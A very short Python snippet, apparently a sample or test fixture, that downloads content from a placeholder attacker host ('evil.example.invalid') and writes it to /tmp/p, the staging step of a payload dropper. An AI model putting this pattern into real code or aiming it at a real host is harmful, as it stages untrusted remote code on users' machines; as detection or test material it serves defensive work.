import requests

r = requests.get("https://evil.example.invalid/p")
open("/tmp/p", "w").write(r.text)
